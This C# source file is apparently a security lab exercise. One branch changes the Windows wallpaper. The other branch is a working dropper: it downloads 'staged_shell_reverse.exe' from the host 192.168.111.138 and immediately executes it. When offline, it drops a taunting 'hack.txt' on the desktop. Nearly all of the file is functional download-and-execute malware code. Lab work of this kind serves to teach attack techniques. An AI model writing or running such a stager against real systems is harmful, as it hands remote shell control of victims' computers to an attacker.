using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using static System.Net.Mime.MediaTypeNames;

namespace LAB2_3_b
{
    class Program
    {
        static void Main(string[] args)
        {
            string imgWallpaper = @"C:\Users\COMPUTER\Pictures\Wallpaper.jpg";
            Console.WriteLine("a or b");
            string userName = Console.ReadLine();
            if (userName == "a")
            {
                if (File.Exists(imgWallpaper))
                {
                    SetWallpaper(imgWallpaper);
                }
                Console.WriteLine("Wallpaper has been set");
            }
            else
            {
                if (CheckForInternetConnection())
                {
                    Console.WriteLine("Connected Internet");
                    Console.WriteLine("Dowloading file from http://192.168.111.138/staged_shell_reverse.exe ");
                    Download();
                    Process.Start("C:\\Users\\COMPUTER\\Desktop\\staged_shell_reverse.exe");
                    Console.WriteLine("Payload file has been  execute");
                }
                else
                {
                    Console.WriteLine("No Internet Connection");
                    CreateFile();
                    Console.WriteLine("File test has been create");
                }
            }

                Console.WriteLine("Press enter to close...");
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
       UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        static public void SetWallpaper(String path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        WebClient client;
        static void Download()
        {
            try
            {
                string url = "http://192.168.111.138/staged_shell_reverse.exe";
                string savePath = @"C:\Users\COMPUTER\Desktop\staged_shell_reverse.exe";
                WebClient client = new WebClient();
                client.DownloadFile(url, savePath);
            }
            catch (Exception)
            {
                throw;
            }

        }
        static void CreateFile()
        {
            string path = @"C:\Users\COMPUTER\Desktop\hack.txt";

            // This text is added only once to the file.
            if (!File.Exists(path))
            {
                // Create a file to write to.
                string createText = "You da bi hack" + Environment.NewLine;
                File.WriteAllText(path, createText);
            }
        }

    }
}
